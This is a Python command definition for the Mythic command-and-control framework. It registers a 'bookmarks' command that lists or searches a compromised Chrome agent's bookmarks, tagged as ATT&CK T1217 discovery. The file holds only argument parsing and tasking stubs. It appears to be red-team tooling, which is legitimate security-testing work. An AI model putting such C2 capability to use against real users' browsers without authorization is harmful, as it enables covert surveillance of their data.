from mythic_container.MythicCommandBase import *


class BookmarksArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["list", "search"],
                default_value="list",
                description="Bookmark action",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="query",
                type=ParameterType.String,
                description="Search text",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split(maxsplit=1)
        if pieces[0] in {"list", "search"}:
            self.add_arg("action", pieces[0])
            if len(pieces) > 1:
                self.add_arg("query", pieces[1])
        else:
            self.add_arg("action", "search")
            self.add_arg("query", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class BookmarksCommand(CommandBase):
    cmd = "bookmarks"
    needs_admin = False
    help_cmd = "bookmarks [list|search]"
    description = "List or search bookmarks"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1217"]
    argument_class = BookmarksArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        display = taskData.args.get_arg("action") or "list"
        if taskData.args.get_arg("query"):
            display += f" {taskData.args.get_arg('query')}"
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=display,
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
